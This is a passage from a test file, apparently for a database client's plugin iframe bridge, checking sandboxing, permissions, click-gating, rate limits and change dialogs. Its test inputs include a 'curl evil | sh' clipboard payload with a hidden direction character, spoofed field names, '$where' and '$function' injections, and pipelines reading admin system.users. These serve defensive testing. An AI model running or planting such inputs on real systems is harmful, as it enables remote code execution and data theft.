        send({ mm: 1, id, method, params }, el.contentWindow!)
        await flushPromises()
        return sent.find((m) => m.id === id)
      },
    }
  }
  /** The user clicks elsewhere in the app: the focus leaves the plugin's frame, activation stays. */
  function clickInApp(): void {
    const other = document.createElement('button')
    document.body.append(other)
    other.focus()
    activation.isActive = true
  }

  it('is sandboxed to scripts only, loaded through its ticket, naming its contribution', async () => {
    // Only the attributes matter here: the page is not loaded.
    const settings = (window as unknown as { happyDOM: { settings: { disableIframePageLoading: boolean } } })
      .happyDOM.settings
    settings.disableIframePageLoading = true
    frame({}, {}, TICKET)
    await flushPromises()
    settings.disableIframePageLoading = false
    const el = document.querySelector<HTMLIFrameElement>('[data-plugin-frame] iframe')!
    expect(el.getAttribute('sandbox')).toBe('allow-scripts')
    expect(el.getAttribute('referrerpolicy')).toBe('no-referrer')
    expect(el.getAttribute('allow')).toBe('')
    const src = new URL(el.src)
    expect(src.pathname).toMatch(/\/plugin-frame\/abc\.def\/index\.html$/)
    expect(src.hash).toBe('#collectionTab=map')
  })

  it('tells the plugin where it is, and its settings', async () => {
    frame()
    const { ask } = await iframe()
    expect((await ask(1, 'context.get'))!.result).toMatchObject({
      locale: 'en',
      accent: 'emerald',
      contribution: { kind: 'collectionTab', id: 'map' },
      place: { connectionName: 'Prod', db: 'shop', coll: 'places' },
      settings: { tileUrl: 'https://tiles.example.org/{z}/{x}/{y}.png' },
    })
  })

  // Review 2026-10-13 (web): the document's _id and the user's filter are data — a plugin without
  // documents:read was told them by context.get, which asks for no permission.
  it('tells a plugin the open document and the filter only with documents:read', async () => {
    const id = { $oid: '6ac625df13a09509ca0da14f' }
    frame({ plugin: runtime({ permissions: [] }), documentId: id, filter: { email: 'ada@example.com' } })
    const { ask } = await iframe()
    const place = ((await ask(1, 'context.get'))!.result as { place: Record<string, unknown> }).place
    expect(place).toMatchObject({ db: 'shop', coll: 'places', documentId: null, filter: {} })
    expect(JSON.stringify(place)).not.toContain('ada@example.com')
    document.body.innerHTML = ''
    frame({ documentId: id, filter: { email: 'ada@example.com' } })
    const reader = await iframe()
    expect(((await reader.ask(1, 'context.get'))!.result as { place: unknown }).place).toMatchObject({
      documentId: id,
      filter: { email: 'ada@example.com' },
    })
  })

  // User report 2026-10-16: a page kept out of sight hears that the filter changed — only one that may
  // read it (a plugin without documents:read learns nothing of the user's querying).
  it('says the context changed when the filter does, to a plugin with documents:read only', async () => {
    const changes = async (plugin: PluginRuntimeView) => {
      document.body.innerHTML = ''
      const { wrapper } = frame({ plugin, filter: { a: 1 } })
      const { sent } = await iframe()
      await wrapper.setProps({ filter: { a: 2 } })
      await flushPromises()
      await wrapper.setProps({ filter: { a: 2 } })
      await flushPromises()
      return (sent as Array<{ type?: string }>).filter((m) => m.type === 'context.changed').length
    }
    expect(await changes(runtime())).toBe(1)
    expect(await changes(runtime({ permissions: [] }))).toBe(0)
  })

  it('keeps open only a collection tab’s page (a panel or an action is kept, or not, by its place)', async () => {
    const { wrapper } = frame({ kind: 'sidebarPanel', contribution: 'side' })
    const { ask } = await iframe()
    expect((await ask(1, 'ui.keepOpen'))!.result).toBe(false)
    expect(wrapper.emitted('keep')).toBeUndefined()
    document.body.innerHTML = ''
    const tab = frame()
    const page = await iframe()
    expect((await page.ask(1, 'ui.keepOpen'))!.result).toBe(true)
    expect(tab.wrapper.emitted('keep')).toEqual([[true]])
  })

  it('finds documents through the app, bounded, on its own collection only', async () => {
    const { calls } = frame(
      {},
      {
        'POST connections/c1/databases/shop/collections/places/find': () => [
          200,
          {
            documents: [{ document: { _id: { $oid: '6ac625df13a09509ca0da14f' } }, hash: 'h' }],
            hasMore: false,
          },
        ],
      },
    )
    const { ask } = await iframe()
    expect((await ask(1, 'documents.find', { filter: { a: 1 }, limit: 5000 }))!.error!.code).toBe(
      'bad_params',
    )
    expect((await ask(2, 'documents.find', { filter: { a: 1 }, limit: 10 }))!.result).toEqual({
      documents: [{ _id: { $oid: '6ac625df13a09509ca0da14f' } }],
      hasMore: false,
    })
    // Never one of the user's recent queries (wave 2 review I1).
    expect(calls.find((c) => c.path.endsWith('/find'))!.body).toEqual({
      filter: { a: 1 },
      skip: 0,
      limit: 10,
      remember: false,
    })
  })

  it('changes a document only when the user confirms, naming the plugin and the change', async () => {
    const id = { $oid: '6ac625df13a09509ca0da14f' }
    const { calls, queryClient } = frame(
      { plugin: runtime({ permissions: ['documents:read', 'documents:write'] }) },
      {
        'POST connections/c1/databases/shop/collections/places/documents/get': () => [
          200,
          { document: { _id: id }, hash: 'H1' },
        ],
        'POST connections/c1/databases/shop/collections/places/documents/update': () => [
          200,
          { modified: 1 },
        ],
      },
    )
    const { el, sent } = await iframe()
    const invalidated: unknown[] = []
    const original = queryClient.invalidateQueries.bind(queryClient)
    queryClient.invalidateQueries = ((filters?: { queryKey?: unknown }) => {
      invalidated.push(filters?.queryKey)
      return original(filters as never)
    }) as typeof queryClient.invalidateQueries
    send({ mm: 1, id: 1, method: 'documents.update', params: { id, set: { tag: 'x' } } }, el.contentWindow!)
    await flushPromises()
    expect(document.body.textContent).toContain('Hello (hello) wants to change a document')
    expect(document.body.textContent).toContain('"tag": "x"')
    ;(document.querySelector('[data-test="cancel"]') as HTMLButtonElement).click()
    await flushPromises()
    expect(sent.find((m) => m.id === 1)!.error!.code).toBe('declined')
    expect(calls.some((c) => c.path.endsWith('/update'))).toBe(false)
    send({ mm: 1, id: 2, method: 'documents.update', params: { id, set: { tag: 'y' } } }, el.contentWindow!)
    await flushPromises()
    ;(document.querySelector('[data-test="confirm"]') as HTMLButtonElement).click()
    await flushPromises()
    expect(sent.find((m) => m.id === 2)!.result).toEqual({ modified: 1 })
    expect(calls.find((c) => c.path.endsWith('/update'))!.body).toEqual({
      _id: id,
      set: { tag: 'y' },
      unset: [],
      hash: 'H1',
    })
    // The app's own views of the collection show the change (review 2026-10-13, web).
    expect(invalidated).toContainEqual(documentKeys.all({ connectionId: 'c1', db: 'shop', coll: 'places' }))
  })

  // Security audit 2026-10-16: a change asked with no click in the plugin could open the question
  // under a double-click; a long change pushed a field out of sight below the one shown.
  it('asks about a change only right after the user clicked in its page, naming every field first', async () => {
    const id = { $oid: '6ac625df13a09509ca0da14f' }
    frame(
      { plugin: runtime({ permissions: ['documents:read', 'documents:write'] }) },
      {
        'POST connections/c1/databases/shop/collections/places/documents/get': () => [
          200,
          { document: { _id: id }, hash: 'H1' },
        ],
      },
    )
    const { ask, el } = await iframe()
    clickInApp()
    expect((await ask(1, 'documents.update', { id, set: { tag: 'x' } }))!.error!.code).toBe('no_activation')
    activation.isActive = false
    el.focus()
    expect((await ask(2, 'documents.update', { id, set: { tag: 'x' } }))!.error!.code).toBe('no_activation')
    expect(document.querySelector('[role="dialog"]')).toBeNull()
    activation.isActive = true
    send(
      {
        mm: 1,
        id: 3,
        method: 'documents.update',
        params: { id, set: { note: 'x'.repeat(1500), 'pro\u200bfile.role': 'admin' }, unset: ['a, b'] },
      },
      el.contentWindow!,
    )
    await flushPromises()
    const message = document.querySelector('[role="dialog"] p')!.textContent!
    // The fields come first, on a line of their own, each quoted (a comma in one is no second
    // field), hidden characters spelled out (review of the security pass, I1).
    expect(message.split('\n')[0]).toBe('Fields: "note", "pro\\u200bfile.role", "a, b"')
    expect(message.indexOf('Fields:')).toBeLessThan(message.indexOf('"$set"'))
    expect(document.querySelector('[role="dialog"]')!.textContent).toContain('Hello (hello) wants to change')
  })

  // Review of the security pass (I1): a field named "note\n\nThe plugin \u2026 Change it?" followed by
  // blank lines showed a harmless change on top and pushed the real one out of sight.
  it('refuses a field name holding a line break, a control or a direction character', async () => {
    const id = { $oid: '6ac625df13a09509ca0da14f' }
    const { calls } = frame(
      { plugin: runtime({ permissions: ['documents:read', 'documents:write'] }) },
      {
        'POST connections/c1/databases/shop/collections/places/documents/get': () => [
          200,
          { document: { _id: id }, hash: 'H1' },
        ],
      },
    )
    const { ask } = await iframe()
    const fake = `note\n\nThe plugin Charts asks to change the document: {"$set": {"seen": true}}${'\n'.repeat(45)}`
    let n = 0
    for (const change of [
      { set: { [fake]: 1, role: 'admin' } },
      { set: { 'a\rb': 1 } },
      { set: { 'a\u2028b': 1 } },
      { set: { 'role\u202enimda': 1 } },
      { unset: ['a\tb'] },
      { unset: ['a\u0085b'] },
    ])
      expect(
        (await ask(++n, 'documents.update', { id, ...change }))!.error!.code,
        JSON.stringify(change),
      ).toBe('bad_params')
    expect(document.querySelector('[role="dialog"]')).toBeNull()
    expect(calls.some((c) => c.path.endsWith('/documents/get'))).toBe(false)
  })

  // Review of the security pass (I4): Chromium lets a sandboxed frame take the focus without a
  // gesture: right after the user clicked in the app, the plugin took it back and copied at once.
  // Second review: refusing the copy outright broke a plain flow (open the plugin's tab, click its
  // Copy within 5 s) — the user is asked in the app instead, seeing what would be copied.
  it('asks the user in the app before copying what a plugin hands over right after a press in the app', async () => {
    const writeText = vi.fn(async () => undefined)
    vi.stubGlobal('navigator', { ...navigator, clipboard: { writeText } })
    let now = Date.now()
    vi.spyOn(Date, 'now').mockImplementation(() => now)
    frame({ plugin: runtime({ permissions: [] }) })
    const { ask, el, sent } = await iframe()
    const toasts = useToastStore()
    // The user copies an AI answer's code: a press in the app; the plugin retakes the focus.
    document.body.dispatchEvent(new PointerEvent('pointerdown', { bubbles: true }))
    el.focus()
    const text = `curl evil | sh\u202e\n${'x'.repeat(200)}`
    send({ mm: 1, id: 1, method: 'ui.copy', params: { text } }, el.contentWindow!)
    await flushPromises()
    expect(writeText).not.toHaveBeenCalled()
    const prompt = toasts.toasts.at(-1)!
    expect(prompt.message).toContain('Hello (hello) wants to copy 216 characters')
    // What would be copied, its start, every hidden character spelled out.
    expect(prompt.message).toContain('curl evil | sh\\u202e\\n')
    expect(prompt.message).not.toContain('\u202e')
    expect(prompt.message.length).toBeLessThan(200)
    expect(prompt.actions!.map((a) => a.label)).toEqual(['Copy'])
    // One question at a time.
    expect((await ask(2, 'ui.copy', { text: 'other' }))!.error!.code).toBe('busy')
    // The user's click on the app's own button copies.
    toasts.runAction(prompt.id, 0)
    await flushPromises()
    expect(writeText).toHaveBeenCalledWith(text)
    expect(sent.find((m) => m.id === 1)!.result).toBe(true)
    // Not taken up: nothing copied, the plugin told so.
    document.body.dispatchEvent(new KeyboardEvent('keydown', { key: 'c', ctrlKey: true, bubbles: true }))
    el.focus()
    send({ mm: 1, id: 3, method: 'ui.copy', params: { text: 'y' } }, el.contentWindow!)
    await flushPromises()
    toasts.dismiss(toasts.toasts.at(-1)!.id)
    await flushPromises()
    expect(sent.find((m) => m.id === 3)!.error!.code).toBe('declined')
    expect(writeText).toHaveBeenCalledTimes(1)
    // Once that press's activation is over, an activation can only come from a frame: copied at once.
    now += 6000
    expect((await ask(4, 'ui.copy', { text: 'mine' }))!.result).toBe(true)
    expect(writeText).toHaveBeenLastCalledWith('mine')
    // What only puts something before the user (a query in Documents) is not held back.
    document.body.dispatchEvent(new PointerEvent('pointerdown', { bubbles: true }))
    el.focus()
    expect((await ask(5, 'ui.useQuery', { filter: { a: 1 } }))!.result).toBe(true)
  })

  // Second review (I2b): the Confirm or Cancel of a first change is itself a press in the app — a second
  // change was refused for 5 s. A change's question has its own guards (its arming, one at a time, two noes).
  it('asks about a change right after a press in the app', async () => {
    const id = { $oid: '6ac625df13a09509ca0da14f' }
    frame(
      { plugin: runtime({ permissions: ['documents:read', 'documents:write'] }) },
      {
        'POST connections/c1/databases/shop/collections/places/documents/get': () => [
          200,
          { document: { _id: id }, hash: 'H1' },
        ],
      },
    )
    const { el } = await iframe()
    document.body.dispatchEvent(new PointerEvent('pointerdown', { bubbles: true }))
    el.focus()
    send({ mm: 1, id: 1, method: 'documents.update', params: { id, set: { a: 1 } } }, el.contentWindow!)
    await flushPromises()
    expect(document.querySelector('[role="dialog"]')!.textContent).toContain('wants to change')
  })

  it('takes a press in the app made before its frame was there into account', async () => {
    const writeText = vi.fn(async () => undefined)
    vi.stubGlobal('navigator', { ...navigator, clipboard: { writeText } })
    // The click that opens the plugin's tab.
    document.body.dispatchEvent(new PointerEvent('pointerdown', { bubbles: true }))
    frame({ plugin: runtime({ permissions: [] }) })
    const { el } = await iframe()
    el.focus()
    send({ mm: 1, id: 1, method: 'ui.copy', params: { text: 'curl evil | sh' } }, el.contentWindow!)
    await flushPromises()
    expect(writeText).not.toHaveBeenCalled()
    expect(useToastStore().toasts.at(-1)!.message).toContain('wants to copy 14 characters')
  })

  it('closes the bridge and the frame when its page goes elsewhere (a foreign page is never answered)', async () => {
    frame()
    const { el } = await iframe()
    el.dispatchEvent(new Event('load'))
    await flushPromises()
    expect(document.querySelector('[data-plugin-frame] iframe')).toBeNull()
    expect(document.querySelector('[data-plugin-stopped]')!.textContent).toContain('left its page')
  })

  it('refuses a change too long to show whole, and spells out characters that hide or reverse text', async () => {
    const id = { $oid: '6ac625df13a09509ca0da14f' }
    const { calls } = frame(
      { plugin: runtime({ permissions: ['documents:read', 'documents:write'] }) },
      {
        'POST connections/c1/databases/shop/collections/places/documents/get': () => [
          200,
          { document: { _id: id }, hash: 'H1' },
        ],
      },
    )
    const { ask, el, sent } = await iframe()
    const long = await ask(1, 'documents.update', { id, set: { note: 'x'.repeat(1990), role: 'admin' } })
    expect(long!.error!.code).toBe('too_large')
    expect(document.body.textContent).not.toContain('wants to change')
    expect(calls.some((c) => c.path.endsWith('/update'))).toBe(false)
    send(
      { mm: 1, id: 2, method: 'documents.update', params: { id, set: { role: 'user\u202Enimda' } } },
      el.contentWindow!,
    )
    await flushPromises()
    const dialog = document.querySelector('[role="dialog"]')!.textContent!
    expect(dialog).toContain('\\u202e')
    expect(dialog).not.toContain('\u202E')
    // While it asks, the question has the focus: the page acts in nothing.
    expect((await ask(3, 'documents.update', { id, set: { a: 1 } }))!.error!.code).toBe('no_activation')
    // One question at a time, even with the page's focus back.
    el.focus()
    expect((await ask(30, 'documents.update', { id, set: { a: 1 } }))!.error!.code).toBe('busy')
    ;(document.querySelector('[data-test="cancel"]') as HTMLButtonElement).click()
    await flushPromises()
    expect(sent.find((m) => m.id === 2)!.error!.code).toBe('declined')
    el.focus()
    send({ mm: 1, id: 4, method: 'documents.update', params: { id, set: { a: 1 } } }, el.contentWindow!)
    await flushPromises()
    ;(document.querySelector('[data-test="cancel"]') as HTMLButtonElement).click()
    await flushPromises()
    // Declined twice: the plugin asks no more.
    el.focus()
    expect((await ask(5, 'documents.update', { id, set: { a: 2 } }))!.error!.code).toBe('blocked')
    expect(document.querySelector('[role="dialog"]')).toBeNull()
  })

  it('opens a document by a value only, never by an operator', async () => {
    frame()
    const { ask } = await iframe()
    for (const id of [{ $regex: '(a+)+$' }, { a: { $gt: 1 } }, { $where: 'sleep(1)' }])
      expect((await ask(Math.random(), 'ui.openDocument', { id }))!.error!.code).toBe('bad_params')
    expect((await ask(9, 'ui.openDocument', { id: { $oid: '6ac625df13a09509ca0da14f' } }))!.result).toBe(true)
  })

  it('reads at most 60 times a minute', async () => {
    frame(
      {},
      {
        'POST connections/c1/databases/shop/collections/places/find': () => [
          200,
          { documents: [], hasMore: false },
        ],
      },
    )
    const { ask } = await iframe()
    for (let i = 0; i < 60; i++) expect((await ask(i, 'documents.find', {}))!.result).toBeDefined()
    expect((await ask(60, 'documents.find', {}))!.error!.code).toBe('too_many')
  })

  it('tells the plugin when the language or the theme changes', async () => {
    frame()
    const { sent } = await iframe()
    i18n.global.locale.value = 'tr'
    await flushPromises()
    expect(sent).toContainEqual({
      mm: 1,
      type: 'context.changed',
      locale: 'tr',
      theme: 'light',
      accent: 'emerald',
    })
  })

  it('knows the same accents as the plugin kit, which takes no other (review 2026-10-10)', () => {
    expect([...KIT_ACCENTS]).toEqual([...ACCENTS])
  })

  it('tells the plugin the user’s accent, as it changes (plugin tabs redesign)', async () => {
    frame()
    const { sent } = await iframe()
    usePreferencesStore().setAccent('ocean')
    await flushPromises()
    expect(sent).toContainEqual({
      mm: 1,
      type: 'context.changed',
      locale: 'en',
      theme: 'light',
      accent: 'ocean',
    })
  })

  it('puts a query in the Documents of its collection, after the user’s click, fetching nothing itself (wave 1)', async () => {
    const { calls } = frame({ plugin: runtime({ permissions: [] }) })
    const { ask } = await iframe()
    const body = { filter: { age: { $gt: { $numberInt: '30' } } }, sort: { name: 1 }, limit: 20 }
    expect((await ask(1, 'ui.useQuery', body))!.result).toBe(true)
    const tabs = useTabsStore()
    expect(tabs.active).toMatchObject({
      kind: 'collection',
      params: { connectionId: 'c1', db: 'shop', coll: 'places' },
    })
    const state = useCollectionViewsStore().stateFor(tabs.active!.id)
    expect(state.section).toBe('documents')
    expect(state.query).toMatchObject({ filter: body.filter, sort: body.sort })
    expect(state.draft.filter).toContain('age')
    expect(calls.some((c) => c.path.endsWith('/find'))).toBe(false)
    for (const bad of [
      { filter: 'x' },
      { filter: { $where: 'sleep(1)' } },
      { filter: { a: { $function: {} } } },
    ])
      expect((await ask(Math.random(), 'ui.useQuery', bad))!.error!.code).toBe('bad_params')
  })

  it('puts stages in the Aggregations of its collection, asking before replacing a pipeline', async () => {
    frame({ plugin: runtime({ permissions: [] }) })
    const { ask, el, sent } = await iframe()
    const stages = [{ $match: { a: 1 } }, { $group: { _id: '$a', n: { $sum: 1 } } }]
    expect((await ask(1, 'ui.useAggregation', { stages }))!.result).toBe(true)
    const tabs = useTabsStore()
    const state = useCollectionViewsStore().stateFor(tabs.active!.id)
    expect(state.section).toBe('aggregations')
    expect(state.aggregation.cards).toHaveLength(2)
    send(
      { mm: 1, id: 2, method: 'ui.useAggregation', params: { stages: [{ $limit: 5 }] } },
      el.contentWindow!,
    )
    await flushPromises()
    expect(document.body.textContent).toContain('Replace')
    ;(document.querySelector('[data-test="cancel"]') as HTMLButtonElement).click()
    await flushPromises()
    expect(sent.find((m) => m.id === 2)!.error!.code).toBe('declined')
    expect(state.aggregation.cards).toHaveLength(2)
  })

  it('runs a read-only pipeline on its collection only, refusing anything that writes, runs code or reads elsewhere', async () => {
    const lines = [
      { document: { _id: 'a', n: { $numberInt: '2' } }, hash: 'h' },
      { end: { count: 1, truncated: false, bytes: 10 } },
    ]
    const { calls } = frame(
      {},
      {
        'POST connections/c1/databases/shop/collections/places/aggregate/run': () =>
          new Response(lines.map((l) => JSON.stringify(l)).join('\n') + '\n', {
            status: 200,
            headers: { 'content-type': 'application/x-ndjson' },
          }),
      },
    )
    const { ask, sent } = await iframe()
    await ask(1, 'documents.aggregate', {
      pipeline: [{ $group: { _id: '$a', n: { $sum: 1 } } }],
      limit: 10,
    })
    // The results are read as a stream, a batch at a time.
    await new Promise((r) => setTimeout(r, 50))
    await flushPromises()
    const ok = sent.find((m) => m.id === 1)
    expect(ok!.result).toEqual({ documents: [{ _id: 'a', n: { $numberInt: '2' } }], truncated: false })
    // Bounded, kept out of the user's recent pipelines (wave 1 review M2).
    expect(calls.find((c) => c.path.endsWith('/aggregate/run'))!.body).toEqual({
      stages: [{ $group: { _id: '$a', n: { $sum: 1 } } }],
      limit: 10,
      remember: false,
      allowDiskUse: false,
      maxTimeMS: 10_000,
    })
    const refused = [
      [{ $lookup: { from: 'users', localField: 'a', foreignField: 'b', as: 'c' } }],
      [{ $facet: { x: [{ $out: 'stolen' }] } }],
      [{ $merge: 'elsewhere' }],
      [{ $group: { _id: null, x: { $accumulator: {} } } }],
      [{ $match: { $where: 'sleep(100)' } }],
      [{ $project: { a: { $function: { body: 'x', args: [], lang: 'js' } } } }],
      [{ $unionWith: 'other' }],
      [{ $graphLookup: {} }],
      [{ $currentOp: {} }],
      'not a pipeline',
    ]
    for (const pipeline of refused)
      expect(
        (await ask(Math.random(), 'documents.aggregate', { pipeline }))!.error!.code,
        JSON.stringify(pipeline),
      ).toBe('bad_params')
    expect((await ask(2, 'documents.aggregate', { pipeline: [], limit: 1001 }))!.error!.code).toBe(
      'bad_params',
    )
    expect(calls.filter((c) => c.path.endsWith('/aggregate/run'))).toHaveLength(1)
  })

  it('runs a join with database:read: a plain $lookup of its own database, nothing more (user request 2026-10-10)', async () => {
    const answer = [{ document: { orderNo: 1, c: { name: 'Ada' } } }, { end: { truncated: false } }]
    const { calls } = frame(
      { plugin: runtime({ permissions: ['documents:read', 'database:read'] }) },
      {
        'GET connections/c1/databases/shop/collections': () => [
          200,
          [
            { name: 'places', type: 'collection', options: {}, readOnly: false },
            { name: 'customers', type: 'collection', options: {}, readOnly: false },
            { name: 'system.views', type: 'collection', options: {}, readOnly: true },
          ],
        ],
        'POST connections/c1/databases/shop/collections/places/aggregate/run': () =>
          new Response(answer.map((l) => JSON.stringify(l)).join('\n') + '\n', {
            status: 200,
            headers: { 'content-type': 'application/x-ndjson' },
          }),
      },
    )
    const { ask, sent } = await iframe()
    const join = [
      { $lookup: { from: 'customers', localField: 'customerId', foreignField: '_id', as: 'c' } },
      { $unwind: { path: '$c', preserveNullAndEmptyArrays: false } },
    ]
    await ask(1, 'documents.aggregate', { pipeline: join, limit: 50 })
    await new Promise((r) => setTimeout(r, 50))
    await flushPromises()
    expect(sent.find((m) => m.id === 1)!.result).toEqual({
      documents: [{ orderNo: 1, c: { name: 'Ada' } }],
      truncated: false,
    })
    expect(calls.find((c) => c.path.endsWith('/aggregate/run'))!.body).toMatchObject({
      stages: join,
      limit: 50,
    })
    // Only the plain form: no pipeline nor let (code and other reads hide there), no other
    // database, no system collection, no join inside $facet, no other stage that reads elsewhere.
    const refused = [
      [{ $lookup: { from: 'customers', as: 'c', pipeline: [{ $match: {} }] } }],
      [{ $lookup: { from: 'customers', localField: 'a', foreignField: '_id', as: 'c', let: { x: '$a' } } }],
      [{ $lookup: { from: 'customers', localField: 'a', foreignField: '_id', as: 'c', pipeline: [] } }],
      [
        {
          $lookup: {
            from: { db: 'admin', coll: 'system.users' },
            localField: 'a',
            foreignField: '_id',
            as: 'c',
          },
        },
      ],
      [{ $lookup: { from: 'system.users', localField: 'a', foreignField: '_id', as: 'c' } }],
      [{ $lookup: { from: 'system.views', localField: 'a', foreignField: '_id', as: 'c' } }],
      [{ $lookup: { from: '$x', localField: 'a', foreignField: '_id', as: 'c' } }],
      [{ $lookup: { from: 'a\u0000b', localField: 'a', foreignField: '_id', as: 'c' } }],
      [{ $lookup: { from: 'x'.repeat(256), localField: 'a', foreignField: '_id', as: 'c' } }],
      [
        {
          $lookup: JSON.parse(
            '{"from":"customers","localField":"a","foreignField":"_id","as":"c","__proto__":{}}',
          ),
        },
      ],
      // Review M5: only a collection the plugin may list (as documents.findIn).
      [{ $lookup: { from: 'nowhere', localField: 'a', foreignField: '_id', as: 'c' } }],
      [{ $lookup: { from: '', localField: 'a', foreignField: '_id', as: 'c' } }],
      [{ $lookup: { from: 'customers', localField: '$a', foreignField: '_id', as: 'c' } }],
      [{ $lookup: { from: 'customers', localField: 'a', foreignField: '_id', as: '$c' } }],
      [{ $lookup: { from: 'customers', localField: 'a', foreignField: 1, as: 'c' } }],
      [
        {
          $facet: { x: [{ $lookup: { from: 'customers', localField: 'a', foreignField: '_id', as: 'c' } }] },
        },
      ],
      [{ $match: { $expr: { $lookup: {} } } }],
      [{ $unionWith: 'customers' }],
      [{ $graphLookup: { from: 'customers' } }],
    ]
    for (const pipeline of refused)
      expect(
        (await ask(Math.random(), 'documents.aggregate', { pipeline }))!.error!.code,
        JSON.stringify(pipeline),
      ).toBe('bad_params')
    expect(calls.filter((c) => c.path.endsWith('/aggregate/run'))).toHaveLength(1)
  })

  it('hands the user a pipeline reading other collections, never one that writes or runs code', async () => {
    frame({ plugin: runtime({ permissions: [] }) })
    const { ask } = await iframe()
    const lookup = [{ $lookup: { from: 'customers', localField: 'c', foreignField: '_id', as: 'customer' } }]
    expect((await ask(1, 'ui.useAggregation', { stages: lookup }))!.result).toBe(true)
    for (const stages of [
      [{ $out: 'x' }],
      [{ $merge: 'x' }],
      [{ $match: { $where: '1' } }],
      [{ $project: { a: { $function: {} } } }],
    ])
      expect(
        (await ask(Math.random(), 'ui.useAggregation', { stages }))!.error!.code,
        JSON.stringify(stages),
      ).toBe('bad_params')
  })

  it('copies a plugin’s text through the app, bounded', async () => {
    const writeText = vi.fn(async () => undefined)
    vi.stubGlobal('navigator', { ...navigator, clipboard: { writeText } })
    frame({ plugin: runtime({ permissions: [] }) })
    const { ask } = await iframe()
    expect((await ask(1, 'ui.copy', { text: 'db.users.find({})' }))!.result).toBe(true)
    expect(writeText).toHaveBeenCalledWith('db.users.find({})')
    expect((await ask(2, 'ui.copy', { text: 'x'.repeat(100_001) }))!.error!.code).toBe('bad_params')
    expect((await ask(3, 'ui.copy', { text: 42 }))!.error!.code).toBe('bad_params')
  })

  it('runs one pipeline at a time for a plugin, stopped when its frame goes (wave 1 review M2)', async () => {
    const { fetchMock, wrapper } = frame(
      {},
      {
        'POST connections/c1/databases/shop/collections/places/aggregate/run': () => new Promise(() => {}),
      },
    )
    const { ask } = await iframe()
    void ask(1, 'documents.aggregate', { pipeline: [{ $match: {} }] })
    expect((await ask(2, 'documents.aggregate', { pipeline: [{ $match: {} }] }))!.error!.code).toBe('busy')
    const run = fetchMock.mock.calls.find(([url]) => String(url).endsWith('/aggregate/run'))!
    const signal = (run[1] as RequestInit).signal!
    expect(signal.aborted).toBe(false)
    wrapper.unmount()
    expect(signal.aborted).toBe(true)
  })

  it('stops its pipeline when its page goes elsewhere (wave 1 review M2)', async () => {
    const { fetchMock } = frame(
      {},
      {
        'POST connections/c1/databases/shop/collections/places/aggregate/run': () => new Promise(() => {}),
      },
    )
    const { ask, el } = await iframe()
    void ask(1, 'documents.aggregate', { pipeline: [{ $match: {} }] })
    const run = fetchMock.mock.calls.find(([url]) => String(url).endsWith('/aggregate/run'))!
    const signal = (run[1] as RequestInit).signal!
    el.dispatchEvent(new Event('load'))
    await flushPromises()
    expect(signal.aborted).toBe(true)
  })

  it('acts in the app only right after the user clicks, and a few times a minute (wave 1 review I1, I2)', async () => {
    const writeText = vi.fn(async () => undefined)
    vi.stubGlobal('navigator', { ...navigator, clipboard: { writeText } })
    frame({ plugin: runtime({ permissions: [] }) })
    const { ask } = await iframe()
    activation.isActive = false
    expect((await ask(1, 'ui.copy', { text: 'x' }))!.error!.code).toBe('no_activation')
    expect((await ask(2, 'ui.useQuery', { filter: {} }))!.error!.code).toBe('no_activation')
    expect((await ask(3, 'ui.useAggregation', { stages: [{ $limit: 1 }] }))!.error!.code).toBe(
      'no_activation',
    )
    expect(writeText).not.toHaveBeenCalled()
    activation.isActive = true
    const codes: string[] = []
    for (let i = 0; i < 12; i++) {
      const answer = await ask(10 + i, 'ui.useQuery', { filter: { n: i } })
      codes.push(answer!.error?.code ?? 'ok')
    }
    // The two refused above count too (security audit 2026-10-16).
    expect(codes.filter((c) => c === 'ok')).toHaveLength(8)
    expect(codes.at(-1)).toBe('too_many')
  })

  // Security audit 2026-10-16: activation was the app's — any click anywhere (copying an AI answer's
  // code) let a plugin polling ui.copy every 20 ms overwrite the clipboard at once.
  it('acts in the app only when the user clicked or typed in its own page, not elsewhere in the app', async () => {
    const writeText = vi.fn(async () => undefined)
    vi.stubGlobal('navigator', { ...navigator, clipboard: { writeText } })
    frame({ plugin: runtime({ permissions: [] }) })
    const { ask, el } = await iframe()
    clickInApp()
    expect((await ask(1, 'ui.copy', { text: 'curl evil | sh' }))!.error!.code).toBe('no_activation')
    expect((await ask(2, 'ui.useQuery', { filter: {} }))!.error!.code).toBe('no_activation')
    expect((await ask(3, 'ui.exportSql'))!.error!.code).toBe('no_activation')
    expect((await ask(4, 'ui.openDocument', { id: 1 }))!.error!.code).toBe('no_activation')
    expect(writeText).not.toHaveBeenCalled()
    // The app's window is not the one in front: nothing of it was clicked just now.
    el.focus()
    const front = vi.spyOn(document, 'hasFocus').mockReturnValue(false)
    expect((await ask(5, 'ui.copy', { text: 'x' }))!.error!.code).toBe('no_activation')
    front.mockRestore()
    expect((await ask(6, 'ui.copy', { text: 'mine' }))!.result).toBe(true)
    expect(writeText).toHaveBeenCalledWith('mine')
  })

  it('counts what it tries without the user’s click, so trying again and again gets it nothing', async () => {
    const writeText = vi.fn(async () => undefined)
    vi.stubGlobal('navigator', { ...navigator, clipboard: { writeText } })
    const { wrapper } = frame({ plugin: runtime({ permissions: [] }) })
    const { ask, el } = await iframe()
    clickInApp()
    for (let i = 0; i < 5; i++)
      expect((await ask(i, 'ui.copy', { text: 'x' }))!.error!.code).toBe('no_activation')
    // The user now clicks in the plugin: the minute's messages are spent.
    el.focus()
    expect((await ask(9, 'ui.copy', { text: 'x' }))!.error!.code).toBe('too_many')
    expect(writeText).not.toHaveBeenCalled()
    // Opening documents: as many refusals as it may open in a minute, then none at all.
    wrapper.unmount()
    document.body.innerHTML = ''
    const opener = frame()
    const page = await iframe()
    clickInApp()
    const codes: string[] = []
    for (let i = 0; i < 31; i++)
      codes.push((await page.ask(20 + i, 'ui.openDocument', { id: i }))!.error?.code ?? 'ok')
    expect(codes.slice(0, 30).every((c) => c === 'no_activation')).toBe(true)
    expect(codes.at(-1)).toBe('too_many')
    page.el.focus()
    expect((await page.ask(60, 'ui.openDocument', { id: 1 }))!.error!.code).toBe('too_many')
    expect(opener.wrapper.emitted('open-document')).toBeUndefined()
  })

  it('opens the app’s SQL page for its database or collection, on the user’s click only (user requests 2026-10-10, 2026-10-11)', async () => {
    frame({ plugin: runtime({ permissions: [] }) })
    const { ask } = await iframe()
    const dialogs = useWorkspaceDialogs()
    activation.isActive = false
    expect((await ask(1, 'ui.importSql'))!.error!.code).toBe('no_activation')
    expect((await ask(2, 'ui.exportSql'))!.error!.code).toBe('no_activation')
    expect(dialogs.current).toBeNull()
    activation.isActive = true
    // User request 2026-10-11: the app's SQL ↔ MongoDB page, on the plugin's database (no dialog).
    const tabs = useTabsStore()
